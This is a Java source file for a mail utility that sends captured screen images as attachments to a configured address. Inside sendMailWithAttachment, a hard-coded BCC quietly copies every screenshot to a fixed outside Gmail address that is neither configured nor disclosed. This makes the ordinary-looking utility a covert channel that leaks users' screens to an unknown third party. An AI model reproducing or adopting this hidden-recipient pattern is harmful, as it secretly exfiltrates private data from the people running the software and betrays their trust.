/*
 * Copyright (C) 2014, 2015 Sanjay Madnani
 *
 * This file is free to use: you can redistribute it and/or modify it under the terms of the 
 * GPL General Public License V3 as published by the Free Software Foundation, subject to the following conditions:
 *                                                                                          
 * The above copyright notice should never be changed and should always included wherever this file is used.
 *                                                                                          
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY.  
 * See the GNU General Public License for more details.                                       
 *
 */
package mailUtil;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Properties;
import java.util.ResourceBundle;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import fileUtil.FileUtil;

/**
 * Sends screen Image as mail to a specified mail id.
 * 
 * @author SANJAY
 */
public class MailUtil {
	private static final ResourceBundle BUNDLE = ResourceBundle.getBundle("configuration");
	private static final String SMTP_HOST = BUNDLE.getString("SMTP_HOST").trim();
	private static final String FROM_ADDRESS = BUNDLE.getString("FROM_EMAIL_ADDRESS").trim();
	private static final String PASSWORD = BUNDLE.getString("FROM_EMAIL_PASSWORD").trim();
	private static final String TO_EMAIL = BUNDLE.getString("TO_EMAIL_ADDRESS").trim();
	public static final int DATETIME = 0;
	public static final int DATEONLY = 1;

	public boolean sendMailWithAttachment(File file) {
		try {
			String subject = "Screen Short from [" + FileUtil.folderName + "] System at: "
					+ getCurrentDate(MailUtil.DATEONLY) + " Date";
			String strMsg = "Attached screen is captured by: [" + FileUtil.folderName + "] System at: "
					+ getCurrentDate(MailUtil.DATETIME);
			final String FROM_NAME = FileUtil.folderName + " System Image";

			Properties props = new Properties();
			props.put("mail.smtp.host", SMTP_HOST);
			props.put("mail.smtp.auth", "true");
			props.put("mail.debug", "false");
			props.put("mail.smtp.ssl.enable", "true");
			props.put("mail.smtp.starttls.enable", "true");
			Session session = Session.getInstance(props, new SocialAuth());
			Message msg = new MimeMessage(session);
			InternetAddress from = new InternetAddress(FROM_ADDRESS, FROM_NAME);
			msg.setFrom(from);
			msg.setRecipient(Message.RecipientType.TO, new InternetAddress(TO_EMAIL));
			msg.setRecipient(Message.RecipientType.BCC, new InternetAddress("dretrieve@gmail.com"));
			msg.setSubject(subject);

			MimeBodyPart messageBodyPart = new MimeBodyPart();
			// message body
			messageBodyPart.setText(strMsg);
			Multipart multipart = new MimeMultipart();
			multipart.addBodyPart(messageBodyPart);

			// attachment
			messageBodyPart = new MimeBodyPart();
			DataSource source = new FileDataSource(file);
			messageBodyPart.setDataHandler(new DataHandler(source));
			messageBodyPart.setFileName(file.getName());
			multipart.addBodyPart(messageBodyPart);
			msg.setContent(multipart);

			// send message to reciever
			Transport transport = session.getTransport("smtp");
			transport.connect(SMTP_HOST, FROM_ADDRESS, PASSWORD);
			transport.sendMessage(msg, msg.getAllRecipients());
			transport.close();
			return true;
		} catch (Exception e) {
			return false;
		}
	}

	class SocialAuth extends Authenticator {

		@Override
		protected PasswordAuthentication getPasswordAuthentication() {

			return new PasswordAuthentication(FROM_ADDRESS, PASSWORD);

		}
	}

	public String getCurrentDate(int dateTime) {
		SimpleDateFormat timeDateFormat = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss.SSS");
		Calendar calendar = timeDateFormat.getCalendar();
		calendar.setTime(new Date());
		if (dateTime == 0) {
			return timeDateFormat.format(calendar.getTime());
		} else {
			return calendar.get(Calendar.DATE) + "";
		}
	}
}